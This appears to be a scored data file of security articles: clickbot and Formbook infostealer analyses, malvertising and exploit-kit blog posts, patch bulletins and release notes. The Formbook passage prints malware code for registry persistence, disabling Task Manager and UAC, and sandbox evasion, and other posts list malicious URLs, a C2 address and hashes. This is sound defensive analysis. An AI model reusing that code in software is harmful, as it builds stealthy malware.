</result>,0.008910712288718647
Listing 12: Reply from the feeder.,0.014833311939913552
"Getting the URL for clicking (GET /r/8m8739v3/0ce110ef35bfe90f53b583174a24963c/AA/0) causes redi-rection via the HTTP Location header.
Location: http://www.cupidspulse.com/?utm_source=clickpayz&utm_medium=CPC&utm_campaign=u_28490",0.011266030084068568
"request:
GET /?utm_source=clickpayz&utm_medium=CPC&utm_campaign=u_28490 HTTP/1.1
Referer: http://arkansas-searcher.com/?q=best+foods+for+weight+loss
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Host: www.cupidspulse.com",0.013116683784689775
Listing 13: Redirection via the HTTP Location header.,0.017064770721804345
"This is the final redirection we were looking for. The Urchin Tracking Module (utm) mentioned in the redirection request is the format used by Google to track unique URLs. So, basically, at the end of this redirection chain, the cupidspulse.com website thinks that someone clicked on a link at arkansas-searcher.com (referer), and was redirected to it. The owners of the cupidspulse.com may therefore believe it has more visitors than it really has. A browser window is again created as a hidden COM object.",0.00914054168580114
"4.4 ZeroAccess/Sirefef
The ZeroAccess clickbot is one of the most prolific and most heavily analysed clickbots, so we will reference one of its previous analyses [10]. Similarly to the other modules, it blocks access to several registry keys and hooks a few APIs related to the sound device. The ZeroAccess fraudulent click module first parses the raw data received from the task server, which consists of a set of referer URLs, each with one or more accompanying ad URLs. Task data is then parsed into referer/ad structures. The structures are then sorted and fraudulent clicks are performed.
Several redirections are made before reaching the ad server. The clickbot client is redirected first to an ad redirection server, secondly to an ad control server, and finally to the ad server itself.
Unlike other clickbots, ZeroAccess does not use threads to simulate user behaviour. The interfaces IHTMLDocument2, IMoniker and IBindCtx are used to perform an ad redirection chain instead.",0.016628692964032687
"4.5 Summary
Table 3 shows a comparison of the clickbot modules. Even though the droppers of Pigeon and Alureon largely differ, the minimalistic clickbot payloads are similar in most features. The ZeroAccess trojan enjoys the greatest complexity and imitates a real user the most accurately. The Wowlik clickbot lies somewhere in between.",0.01110291913014394
"Pigeon
Alureon
Wowlik
ZeroAccess
Compiler
Visual C++ 9.0, custom
Visual C++ 9.0, custom
Custom
Custom
32-bit & 64-bit
Yes
Yes
Yes
Yes
Config file
-
<random name>
wow.ini
@
Inner name of DLL (exports)
___ (Start, Stop)
-
um, um64 (StubLoadDll)
[email protected]
, 80000064.64
Level of real user simulation
+
+
++
+++
Reconfiguration of Security Zones
Yes
Yes
Yes in newer versions
No
Injected into process
svchost.exe
svchost.exe
dllhost.exe
svchost.exe
Searchers & keywords
Downloaded
Downloaded
Hard coded
Downloaded
Table 3. Comparison of clickbot modules.",0.014131488737678
"5. Conclusion
The Blackbeard/Pigeon clickbot follows the path that was previously set by ZeroAccess. It uses a sophisticated method to stay persistent in a victim’s computer. Analysing this kind of threat is not a straightforward task, because the entire process is divided into several stages, running in several different processes and requiring different resources and permissions. Therefore it could be said that the overall complexity of programs performing click fraud often overcomes the sophistication of common banking trojans. The only slight advantage for a victim is the fact that the financial damage is indirect – decreased performance and disruption to the system usage. However, click fraud negatively affects the whole online advertising environment, especially advertisers who pay for ineffective traffic.",0.011925177905217077
"Acknowledgement
We would like to thank Jindrich Kubec for his advice and information on the malware distribution chain.",0.01607039479376282
"Bibliography
[1] Salmela, K. An unknown exploit kit with a far reach.http://coffeeshopsecurity.blogspot.cz/2013/10/an-unknown-exploit-kit-with-far-reach.html.
[2] Guy, J. Case Study: Click Fraud Malware Using NOTEPAD.EXE as a Cover. http://www.carbonblack.com/case-study-click-fraud-malware-using-notepad-exe-as-a-cover-2/.
[3] Kálnai, P. Win32/64:Blackbeard & Pigeon: Stealthiness techniques in 64-bit Windows, Part 1. http://blog.avast.com/2014/01/15/win3264blackbeard-pigeon-stealthiness-techniques-in-64-bit-windows-part-1/.
[4] Lempel-Ziv-Oberhumer data compression algorithm (LZO). http://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Oberhumer.
[5] Reading memory of x64 process from x86 process. http://blog.rewolf.pl/blog/?p=319.
[6] List of Windows 7 (beta build 7000) auto-elevated binaries. http://withinwindows.com/2009/02/05/list-of-windows-7-beta-build-7000-auto-elevated-binaries/.
[7] Windows 7 UAC whitelist: Proof-of-concept source code. http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html.
[8] CVE-2013-3660. http://www.exploit-db.com/exploits/25611.
[9] Windows File Protection. http://bitsum.com/aboutwfp.asp.
[10] Low, W. A deeper look into the ZeroAccess clickbot. Virus Bulletin, April 2013. https://www.virusbtn.com/virusbulletin/archive/2013/04/vb201304-ZeroAccess.
[11] Horejší , J. Win32/64:Blackbeard & Pigeon: Stealthiness techniques in 64-bit Windows, Part 2. http://blog.avast.com/2014/01/22/win3264blackbeard-pigeon-stealthiness-techniques-in-64-bit-windows-part-2/.
[12] Stop Malvertising, Analysis of a Triple Click Fraud Threat. http://stopmalvertising.com/rootkits/analysis-of-a-triple-click-fraud-threat.html.
[13] Lelli, A. Sophisticated Viknok Malware proves click fraud still money maker scammers. Symantec blog, May 2014. http://www.symantec.com/connect/blogs/sophisticated-viknok-malware-proves-click-fraud-still-moneymaker-scammers.",0.019399895990403704
"Appendix: Samples
Blackbeard custom packed
CD423CEF022CBA16EED76F5424B9FA099F2FAAA5238A52187F215BF8C05D1A5F
Blackbeard drive-by download
CAD3619A0736BDE5FB7ABCC405FE97C216F240CD21685B74ED5DDDFEC58BD513
Infected 32-bit rpcss.dll
5BB36D5C17B193844CAC6E143E8940317519C478D7AC595CFC80C8C49F0A1541
Infected 64-bit rpcss.dll
C668A80700DA4578D0A8F03B24C6516DD7D14CE88CEA73FCA47BA08B431859E0
Patched randomly chosen and copied 64-bit dll library
C493D1F3E1AEC5E6B31E34CB2A68B76A8EA7C8204037D30150A70A243D45D1F1
Blackbeard downloader (Feb 2012)
D09242AC19497C2CCCE5B493D41CC3F60E3440F7B18516D37F61336326141BF4
Blackbeard downloader (Nov 2013)
3B2DBA499FC805C363F91940FDAC01D376F7F93F958CADC249F456DD239C78C2
Blackbeard/Pigeon (April 2014)
8A5441B6D9A183CD281C7E7AAE933A75DF907F5A2D771317984342596C467E0E
Pigeon clickbot 32-bit
33CF9FC1CEE508B69FD931CEA7D3B178F70303B86DE6DEB67F45FEB610E52733
Pigeon clickbot 64-bit
EC14BB034EB2327F841A8E4AE2DEB2766B02D5459116026907806D04FD84F6EA
Alureon clickbot 32-bit
D213C2405ECA561C601050BFF0514FBC7FDF64F7B61F20093E43D4CD47F40DBB
Alureon clickbot 64-bit
AFABC8335F6852FE6DC6DBD8FAEB7B18AB2E77E02A56E2465B00F58D4B560449
Wowlik clickbot 32-bit v1.2
D2AA674AD52310CEC6F4320AA9D340B0279ED896A7245D6A07500B90859374E8
Wowlik clickbot 32-bit v1.5
10C647F3DEB73D39DD44AF79F3B81BB8D5B84491CE06805FA17027108FC88B7F
Wowlik clickbot 64-bit >= v2.2
594247F752772CA316920F4AAC14A76CC0F136A0D4BE4B740BC1282651240506
Sirefef clickbot 32-bit
982F5F47761F9E686FD6635F43AC045426FD3933F05D32030AC65280B3817AC2
Sirefef clickbot 64-bit
890DDC3E75B36F5AFDACD7394BC2A391F92504A3FE64C3714F877A5E7C0724F9
",0.02108499793725971
"Mac Flashback Trojan: If you use Java the time to patch your Mac is now
If you are a Mac user and you have Java installed on your Mac, then right now would be a good time to run Software Update… from the Apple menu to make sure you have installed the latest Java for Mac OS X update. Installing this update will help protect your Mac from a malicious",0.015804907561747905
5 Apr 2012 - 11:39AM,0.01100019265412111
"If you are a Mac user and you have Java installed on your Mac, then right now would be a good time to run Software Update… from the Apple menu to make sure you have installed the latest Java for Mac OS X update. Installing this update will help protect your Mac from a malicious",0.015492811028342546
"If you are a Mac user and you have Java installed on your Mac, then right now would be a good time to run Software Update… from the Apple menu to make sure you have installed the latest Java for Mac OS X update. Installing this update will help protect your Mac from a malicious software attack being referred to in the media as Mac Flashback Trojan. News of the Mac Flashback Trojan attack has been spreading rapidly and with good reason; this software exploits Java to seriously compromise sensitive data such as usernames and passwords. (Note: Even though users of ESET Cybersecurity for Mac are already protected against this latest version of OSX/Flashback, as well as previous versions, we still recommend that you perform this update right away.)",0.011406841473675322
"We will be posting more details of this threat as they emerge but for now the main thing to know is that a patch is available and you should perform the update. In fact, I just ran Software Update on my own Mac and here's what it looks like if you have not yet installed the update.",0.014599725264960228
"As you can see, I am still running Mac OS X 10.6. The update is also available for Lion. Although Lion does not come with Java insatalled, you may have installed Java on your Lion machine in order to run certain applications (or it might be left over if you upgraded to Lion from a previous version of Mac OS X).",0.014524297086871085
"The update addresses a number of known vulnerabilities in Java (CVE-2011-3563, CVE-2011-5035, CVE-2012-0497, CVE-2012-0498, CVE-2012-0499, CVE-2012-0500, CVE-2012-0501, CVE-2012-0502, CVE-2012-0503, CVE-2012-0505, CVE-2012-0506, CVE-2012-0507). There is more information about the security issues addressed by this update in Apple Knowledge Base article HT5228. which states:",0.014896147066575938
"""Multiple vulnerabilities exist in Java 1.6.0_29, the most serious of which may allow an untrusted Java applet to execute arbitrary code outside the Java sandbox. Visiting a web page containing a maliciously crafted untrusted Java applet may lead to arbitrary code execution with the privileges of the current user.""",0.010690464230058705
"Regular readers of this blog will know that malware exploiting Java vulnerabilities is not a new problem for Mac OS X or any other platform for that matter. Only last week we took an in-depth look at a targeted malware attack that exploited a Java vulnerability and carried a Mac OS X payload. That Java vulnerability had been patched by Apple some time ago. By installing this latest update right now you will help close the window of vulnerability being exploited by the Mac Flashback Trojan.
",0.010554712848076742
"In an attempt to aggregate as much traffic as possible, cybercriminals systematically abuse popular brands and online services. Next to periodically rotating the brands, they also produce professional looking email templates, in an attempt to successfully brand-jack these companies, and trick their customers into interacting with the malicious emails.
Today’s highlight is on a currently spamvertised client-side exploits and malware serving campaign impersonating UPS (United Parcel Service). Once users click on the links found in the malicious email, they’re automatically redirected to a Black Hole exploit kit landing page serving client-side exploits, and ultimately dropping malware on the exploited hosts.
More details:",0.016345040747769657
Screenshot of the spamvertised email:,0.01024206182675269
"Upon clicking on the client-side exploits serving links, users are exposed to the following bogus “Page loading…” page:",0.010370975060230547
"Spamvertised URL: hxxp://218068.com/upinv.html
Client-side exploits serving URL: hxxp://proamd-inc.com/main.php?page=8cb1f95c85bce71b
Client-side exploits served: CVE-2010-1885
Upon successful client-side exploitation, the campaign drops MD5: 4462c5b3556c5cab5d90955b3faa19a8 on the exploited hosts. Detection rate: the sample is detected by 29 out of 41 antivirus scanners as Trojan.Injector.AFR; Worm.Win32.Cridex.fb.
This is the third UPS-themed malware serving campaign that we’ve intercepted over the past two months. Next to the malware serving campaigns impersonating DHL, we expect that we’re going to see more malicious activity abusing these highly popular courier service brands.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009990845895329947
"DirectRev Malvertising Uses Self Sufficient Flash 0Day
We have been observing a surge in drive-by download attacks since the recent Flash zero-day (now patched). This is due to the fact that the exploit has been integrated into several exploit kits and many end users have not yet patched their machines.
Today, we noticed CVE-2015-5119 (the identifier for this vulnerability) being used in a rather unusual attack pattern. Instead of using an exploit kit, malicious actors have uploaded a rogue Flash ad which further launches another Flash file containing the zero-day exploit.
It began with a malvertising attack from the DirectRev ad network where a maliciously advert was hosted directly on their server (static.directrev.com/hbruse/flash0807.swf).",0.012612507721928679
"Update: DirectRev has told us they have now closed this particular campaign and that they will flush the rogue ad from their CDN.
The ad is booby-trapped such that it silently loads an external URL. This is a big ‘no-no’ when it comes to online advertising.
We can clearly see how the malicious actor crafted the URL by using a very basic regular expression to slightly bypass security scanners looking for a URL pattern:",0.010875317809228457
Replacing the ‘iii’ with blanks gives out the URL we are looking for:,0.008658468793290908
"This is a link to another Flash file (nokerling.eu/anUyRBsRSVIWI21XNwAAGQo.swf), which happens to be CVE-2015-5119, the most recent Flash zero-day. It’s worth noting the presence of an XML allowing the cross-domain-policy in the browser:",0.007890322390536442
"Finally, the exploit itself where shellcode is loaded via the classic ByteArrayAsset:",0.008157714421792694
"The malware dropped from this exploit is detected as Trojan.Kovter by Malwarebytes Anti-Malware and talks back to 155.94.67.5/upload.php.
Summary of the attack:",0.009539675343242848
"As you can see, there is no landing page here or other artifacts. The malvertising attack works directly with the exploit, making this drive-by download very lightweight and efficient.
Malwarebytes Anti-Exploit users were protected from this exploit:",0.013274594155792019
"DirectRev has been notified about that incident taking place on their network. As with most attacks via malvertising, the exploit code is only served once per IP address and some geolocation checks are performed to make sure the user is genuine and not hiding behind a VPN.
We will update this blog if we receive additional details.
",0.00875619894187385
UTM Up2Date 9.210 Released,0.008491559192916776
"Written by
Eric Bégoc",0.010229904213713614
"November 27, 2014",0.008640137796994574
Network up2date UTM UTM 9,0.01007005226623292
"A new Up2Date package for Sophos UTM is available as of today.
Besides many fixes for which you will find details below, this update further reduces risks from the POODLE vulnerability (CVE-2014-3566) through fixes for SMTP and POP3.
If you want to update to UTM 9.3 please also read our knowledgebase article to make sure you understand available upgrade paths.",0.00921033689502826
"Sophos UTM 9.210 – Details
News",0.009472562560038922
Maintenance Release,0.008862652998154363
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected Wifi APs will perform firmware upgrade",0.008729859254918315
Bugfixes,0.009816324567177737
"27257 RED50 frequently reconnecting because configuring an Additional Address as UTM-Hostname is not supported
27588 Unable to fetch POP3 accounts on iOS devices via POP3 Proxy
27647 aua does not work with facility http while installing basic guard license
27905 [BETA] log the mac addresses human readable with leading zeros in the packetfilter log
28056 it’s not possible to view or download large log files in the webadmin because root partition is too small
28400 Syslog not started after ipsbundle pattern installation
28842 HA takeover if master reboots takes too much time
28966 exceptions for Common Threat Filters do not work individually
29412 Wireless Security Manager Role can’t accept new AP’s
30800 [BETA] Some double byte characters aren’t filtered by DLP custom rule and AntiSpam Expressions filter.
31083 Remote SSL VPN view is empty in printable configuration
31340 rsyncd not started after switching to master mode (slave node hangs in syncing state)
31387 ad-sid-sync.pl is executed even if AD sync is disabled
31534 Wrong date in executive report
31581 Up2date pattern rpm’s fails to install if hostname contains ‘/’ character.
31859 Make http proxy handle uncompressed DNS responses
32034 Full transparent AD SSO redirect URL request gets dropped by packetfilter
32079 UMTS modem device hanging
32097 High load after pattern installation [9.2]
32190 Policy tester always returns “allowed” if warn page is proceeded once
32391 UMTS interface doesn’t come up again after the speed changed from 4G to 3G
32433 Not possible to delete VPN tunnel managed by SUM after use “cleanup object”
32537 Guest login fails in transparent browser auth mode if “terms of use” confirmation is required
32552 Quarantined mail will be quarantine again after release with the same reason
32588 Can’t restore backup beacause of an undefined value
32602 Web control policy not applying to endpoints
32604 Special characters like umlauts didn’t work in passwords with reverse authentication for the WAF
32607 Not possible to use virtual mac on lag interfaces
32683 Can’t send a VPN Profile to the SMC if the Organization Name includes a umlaut
32690 It’s not possible to use Subfolders for Remote Log File Archives over SMB on CIFS share
32696 Hotspot: only one login possible per username for backend authentication hotspot
32703 Multicast traffic problems after upgrading to SG430 and 9.204
32711 Mail preview should display kyrilic or chinese chars too.
32713 Console keyboard doesn’t work
32726 Dashboard does not show Antivirus active protocols for HTTP/S
32794 vpn-reporter.pl segfault in get_amazonvpc
32805 NETDEV WATCHDOG: eth0 (tg3): transmit queue 0 timed out
32832 Remote Syslog Server IPv6 support
32837 vpn-reporter.pl segfaults, error 4 in libc-2.11.3.so
32851 Device auth reports wrong client information
32852 Any SSL traffic through HTTP proxy gets classified as “Sophos Portal” if a “Sophos Portal” AppCtrl rule exists
32870 ad-sid-sync.pl fails to lookup trusted domains groups
32940 SG550: Licensing does not work if module is relocated after installation
32950 Configuring a whitelist in webfilter filter action appears in blacklist on UTM
32957 winbindd died in kernel_vsyscall
32969 Coredumps from reverseproxy after update to v9.206
32972 IPS exception does not work for SID 18575
32980 Remove RC4 from TLS ciphers in Exim
33019 After upgrading to iOS 8 UTM does not recognize iOS anymore (Device-specific Authentication)
33111 Group matching incorrect if user belongs to static and backend groups
33277 [9.2] Add support for passthrough NTLM connection
33307 Not possible to change TLS certificate
33323 Using @ in hostname results in corrupt /etc/syslog-ng.conf
33382 Config changes in IPsec remote access sometime causing a drop of established connections
33429 AP100: Unable to authenticate with an SSID using a PSK with a dollar character
33515 SMTP Vulnerability in SSL v3.0
33516 POP3 Vulnerability in SSL v3.0
33613 OS X HTTPS traffic identified as iOS
33690: HTTP responses which contain malware and are delivered with “Content-Encoding: deflate” are not caught by virus scanners",0.009714201268237743
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.209008-210020.tgz.gpg",0.010202101411069475
"Up2date MD5sum:
9489592f7b7bfbe44071e29bf7e3f851",0.009714138327578281
"File size:
≈120MB",0.0080979100018026
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Got an Android? I hope you’re patching it
Chances are that many people will have been treated to an Android smartphone over the holiday period, and are already finding that it needs an update to make it work more safely.",0.015093880582649266
Graham Cluley,0.010131928644261823
5 Jan 2016 - 04:04PM,0.01166404890657402
"Chances are that many people will have been treated to an Android smartphone over the holiday period, and are already finding that it needs an update to make it work more safely.",0.014027680391281883
"If you are one of the many millions of people who owns an Android phone, I do hope you’re managing to keep it updated.",0.020156260257895853
"For some Android users it’s easy to keep up with the latest security patches.  Perhaps unsurprisingly, it’s owners of Google-manufactuered Nexus Android phones who seem to be the best off – now receiving security updates on a monthly basis.  But some of the other major manufacturers are also getting better at rolling out updates in a reasonably timely fashion.",0.014624154106716247
"Which is important, because new flaws are found in the Android operating system all the time and they could – potentially – be exploited by malicious hackers to compromise your smartphone or steal your data.",0.012523329629322011
"Just yesterday, Google announced that it had released its latest monthly over-the-air (OTA) security update, addressing a number of security issues.",0.022141594875444648
"Yes, chances are that many people will have been treated to an Android smartphone over the holiday period, and are already finding that it needs an update to make it work more safely.",0.015357150445389767
"The flaws, which are found in multiple versions of Android – from 4.4 KitKat to 6 Marshmallow – are listed below:",0.01074462298090284
"Issue
CVE
Severity",0.008985660653004657
"Remote Code Execution Vulnerability in Mediaserver
CVE-2015-6636
Critical",0.006553294335774007
"Elevation of Privilege Vulnerability in misc-sd driver
CVE-2015-6637
Critical",0.006138088399933683
"Elevation of Privilege Vulnerability in the Imagination Technologies driver
CVE-2015-6638
Critical",0.005559980058914782
"Elevation of Privilege Vulnerabilities in Trustzone
CVE-2015-6639
Critical",0.0070752241324798515
"Elevation of Privilege Vulnerability in Kernel
CVE-2015-6640
Critical",0.008612255437780436
"Elevation of Privilege Vulnerability in Bluetooth
CVE-2015-6641
High",0.00781031328354731
"Information Disclosure Vulnerability in Kernel
CVE-2015-6642
High",0.008952459141910674
"Elevation of Privilege Vulnerability in Setup Wizard
CVE-2015-6643
Moderate",0.006378480732335823
"Elevation of Privilege Vulnerability in Wi-Fi
CVE-2015-5310
Moderate",0.007289167624594417
"Information Disclosure Vulnerability in Bouncy Castle
CVE-2015-6644
Moderate",0.007541793422942478
"Denial of Service Vulnerability in SyncManager
CVE-2015-6645
Moderate",0.00694631501089682
"Attack Surface Reduction for Nexus Kernels
CVE-2015-6646
Moderate",0.008818203351889098
"The most concerning of the flaws (given the identifier CVE-2015-6636) was given the highest severity rating of “Critical” and could allow remote code execution on vulnerable devices through a variety of methods – including email, web browsing and MMS when handling media files.",0.009000935139911959
"In other words, a malicious hacker could boobytrap a movie file, plant it on a website or send it to you via email or MMS, and within two shakes have installed malware, taking remote control of your smartphone and snooping upon your files and conversations.",0.01307651643726404
"That, I’m sure you will agree, is a pretty serious vulnerability.  Fortunately, Google says it has had “no reports of active exploitation of these newly reported issues.”",0.01465384943133552
"Flaws taking advantage of Android’s shaky handling of MMS files have been giving Google something of a headache in recent months, with the so-called Stagefright vulnerabilities generating many headlines.",0.014569984413481896
Things didn’t improve when Google’s patch for the Stagefright security hole was found to not actually work properly.,0.012998309589526746
Let’s hope that Google has done a better job this time.,0.01602707703585249
"And my advice is that if you have a vulnerable Android device, you should patch it.  But Google has only released fixes for the Android smartphones which it manufactures.  If you own an Android made by another firm then you have to wait for them to push out a patch, and for it to be delivered by your carrier.",0.013434596110342145
"Google says that it informed its Android partners about the issues, and provided updates for the issues described in its security bulletin, in early December, and that source code patches will be released to the Android Open Source Project (AOSP) repository shortly.",0.01553736398346195
"When your device prompts you that a security update is available, be sure to apply it.  If you aren’t one of the lucky ones to be told there is a security update, you should perhaps be having some strong words with your phone’s manufacturer – as maybe they need to be told that you’ll be less likely to buy one of their devices in future, if they can’t get a proper handle on keeping it updated.",0.012833206417805498
"Picture credits: (c)flickr/khamtran.
",0.013612577219707322
VB2018 paper: Inside Formbook infostealer,0.009857041317790194
Gabriela Nicolao,0.009853762382796782
"Deloitte, Argentina",0.00982847460805325
Copyright © 2018 Virus Bulletin,0.009633121006031975
"Table of contents
Abstract About formgrabbers Formbook background Characteristics Control panel Campaigns Analysis 1. Hiding mechanism 2. Persistence mechanism 3. Protection disabling and anti-analysis 4. Check default browser 5. Formbook deletion and termination Conclusion IOCs References",0.012996093845377144
Abstract,0.009485057568311417
"Formbook [1] is an infostealer that has been advertised for sale in public hacking forums since February 2016 by a user with the handle 'ng-Coder'. It is more advanced than a keylogger as it can retrieve authorization and login credentials from a web data form before the information reaches a secure server, bypassing HTTPS encryption. Formbook is effective even if the victims use a virtual keyboard, auto-fill, or if they copy and paste information to fill the form. The author of Formbook affirms that it is 'browser-logger software', a.k.a. form-grabbing software. Formbook offers a PHP panel, where the buyers can track their victims' information, including screenshots, keylogged data, and stolen credentials. Hosting and domain services are provided for low prices with a bin only available in the Pro version.",0.014913890235695004
"Formbook was used in a spam campaign in late 2017, targeting the aerospace, defence contractor and manufacturing sectors in South Korea and the USA. It includes hiding, persistence, anti-analysis, deletion and termination mechanisms along with several commands that the C&C (command-and-control) server can receive. The 'ng-Coder' user indicated that Formbook should not be used for malicious purposes and blocked sales until further notice after the spam campaigns became known. According to 'ng-Coder', Formbook should only be used to spy on family members or employees if the user has the explicit right to do so. However, this claim is dubious given the barely legitimate nature of the use of such software.",0.009196991306037683
About formgrabbers,0.010143256363473019
"Formgrabbers intercept HTTP(S) data and use inline hooking to redirect the function to one within the formgrabber before transferring the execution flow back to the HTTP function to complete the request. This technique allows formgrabbers to capture a user's information before the user submits it over the Internet to a secure server. While keyloggers focus mainly on capturing the user's input, formgrabbers collect pasted information and/or information selected via a drop-down option, which makes them more efficient than keyloggers.",0.014997941986919838
"A formgrabber injects a DLL (Dynamic Link Library) into a browser and monitors for calls to the HttpSendRequest API within WININET.DLL in order to intercept the data before encryption and send all requests to its own code, prior to sending the data onwards. Andromeda (aka Gamarue), Tinba and Weyland‑Yutani BOT are some malware families that use this technique.",0.013754474939212336
Formbook background,0.008775031782630727
"Prior to advertising it for sale, a user with the handle 'ng-Coder' offered Formbook for free in public hacking forums so that other users could review it.",0.01154974199146619
Figure 1: First mention of Formbook in a forum.,0.012898081420140373
"Soon after the free version was released, the user 'ng-Coder' advertised Formbook for sale at an initial price of 250 USD. However, the author reduced the price to 120 USD in early March 2016 after receiving several complaints about the price from forum members. The current pricing list and payment methods offered in the forum are displayed in Figure 2.",0.012950067022430733
Figure 2: Pricing list and payment methods for Formbook.,0.015297577181969446
Characteristics,0.010004735599649872
"According to the user 'ng-Coder', Formbook boasts the following features:",0.010360470516649234
Coded in ASM/C (x86_x64),0.014611354950504807
Startup (hidden),0.010763694704828075
Full PE-injection (no DLL/no drop/both x86 and x64),0.01427049430857319
Ring3 kit,0.00702758365239553
Bin is Balloon Executable (MPIE + MEE),0.011858390568362798
Doesn't use suspicious Windows APIs,0.007686629485929464
"No blind hook, all hooks are thread safe including the x64, so crash is unlikely",0.00885493093987122
All communications with the panel are encrypted,0.00893352828535443
Install manager,0.007608060920674009
File browsing (FB Connect),0.01358787967178976
Full Unicode support.,0.01596201459682889
Control panel,0.008042397545576785
"Formbook works as a botnet, infecting victims that are shown in a web panel in order to manage the information that is retrieved from them. Figure 3 shows the web panel.",0.009173836290314208
Figure 3: Formbook web panel.,0.013735693050146436
Each bot can receive the following commands from the C&C server:,0.009693886890442927
Download and execute,0.007953863939986316
Update,0.010810496405107006
Uninstall,0.009023534562419777
Visit URL,0.008214327973881774
Clear cookies,0.009146194944506969
Restart system,0.007466449549552112
Shut down system,0.008512940518905165
Force upload keystroke,0.009698509415192902
Take screenshot,0.008638086155705382
FB Connect (file browsing),0.011696948287902242
Download and execute from FB Connect,0.00730482562690149
Update bin from FB Connect,0.007954191452552162
Campaigns,0.010017045897270593
"Formbook was used in spam campaigns targeting the aerospace, defence contractor and manufacturing sectors within the US and South Korea in 2017 [2]. It was distributed via PDFs with embedded links, DOC and XLS files with malicious macros, and compressed files containing the executable.",0.011873450671636365
"It was also observed in 2018, distributed via emails with DOCX files that contained a URL [3]. This URL downloaded an RTF file that exploits CVE-2017-8570 and drops an executable. This executable downloads the Formbook sample.",0.010002847381978652
Analysis,0.009005314284015964
"The analysed sample is a RAR self-extracting archive (SFX) that contains several files, as shown in Figure 4.",0.02075639887011249
Figure 4: SFX file.,0.015568685999236775
The description to the right of the files shows the following strings:,0.008163792511796664
Path=%LocalAppData%\temp\cne,0.008718789242338376
Silent=1,0.007946701988998606
Update=UcE1U8,0.00834101442213786
Setup=axo.exe pwm-axa,0.00829330586995225
Files with a size below 1K contain a few strings that are probably used during decompression.,0.011952936572752315
"After executing the SFX file, Formbook extracts the files in %LocalAppData%\temp\cne using CreateDirectoryW. It then deletes the SFX file. Figure 5 shows the file extraction.",0.011996798639713924
Figure 5: File extraction.,0.014382145093514653
The axo.exe file is an AutoIt script that is executed with the pwm-axa file as a parameter. Figure 6 shows the properties of the axo.exe file.,0.007756148806823959
Figure 6: Properties of the axo.exe AutoIt executable.,0.010336207796064034
"The script decrypts Formbook and loads it in memory. In order to do this, it creates a file with a random name that contains Formbook's functionality and deletes it soon after loading it in memory. This file contains 44 functions with obfuscated names. The sni.mp3 file includes interesting strings that were used during the execution, as shown in Figure 7.",0.010764579092541693
Figure 7: Interesting strings found in the sni.mp3 file.,0.01722285859981454
The script contains the following features:,0.008727857907248282
1. Hiding mechanism,0.009588561333090495
"The script changes the cne folder attributes to hide its content by executing the command FileSetAttrib($cne_Folder_Path, ""+H"").",0.010683929495242328
2. Persistence mechanism,0.008816220478231052
"In order to remain persistent, it modifies the Run registry key with a new key named WindowsUpdate that instructs the execution of axo.exe along with pwm-axa:",0.007503078707898014
"If IsAdmin() Then
RegWrite(""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", $WindowsUpdate, ""REG_SZ"", $cne_Folder_Path & ""\"" & $axo.exe & "" "" & FileGetShortName(FileGetShortName($cne_Folder_Path & ""\"" & $pwm-axa)))
Else
RegWrite(""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", $WindowsUpdate, ""REG_SZ"", $cne_Folder_Path & ""\"" & $axo.exe & "" "" & FileGetShortName($cne_Folder_Path & ""\"" & $pwm-axa))
RegWrite(""HKCU64\Software\Microsoft\Windows\CurrentVersion\Run"", $WindowsUpdate, ""REG_SZ"", $cne_Folder_Path & ""\"" & $axo.exe & "" "" & FileGetShortName($cne_Folder_Path & ""\"" & $pwm-axa))
EndIf
Sleep(1000)
Sleep(1000)
EndFunc",0.022755354664224514
Figure 8: Persistence mechanism.,0.016952757828697873
3. Protection disabling and anti-analysis,0.008235292704271258
The script tries to modify the following registry keys:,0.008346257516853806
"RegWrite(""HKCU64\Software\Microsoft\Windows\CurrentVersion\Policies\System"", ""DisableTaskMgr"", ""REG_DWORD"", ""1"")",0.017386088061916882
"RegDelete(""HKLM64\Software\Microsoft\Windows NT\CurrentVersion\SPP\Clients"")",0.0175115276106248
"RegWrite(""HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"", ""EnableLUA"", ""REG_DWORD"", ""0"")",0.02057677523744772
And it:,0.008215392637523133
Disables Task Manager,0.008223051300673134
Turns off the system protection,0.007534100879053818
Disables UAC (User Account Controls),0.01674399577352026
Formbook will terminate if it finds VMware or VirtualBox processes running in the victim's system and if the 'D' drive has space of less than 1MB:,0.008249938402505652
VMwaretray.exe,0.007737087574495427
Vbox.exe,0.007681042402885585
VMwareUser.exe,0.007601245822813185
VMwareService.exe,0.007871080973653632
VboxService.exe,0.007634934721578612
vpcmap.exe,0.007883074383487898
VBoxTray.exe,0.007977324295863841
"If DriveSpaceFree (""d:\"") <1 And ProcessExists ([VMWare or VBox]) then Exit",0.01120020477773187
4. Check default browser,0.007976164006522568
The script will check the HKCR\http\shell\open\command registry key to know which Internet browser the victim's machine uses by default.,0.008349926298516608
5. Formbook deletion and termination,0.007305687687067408
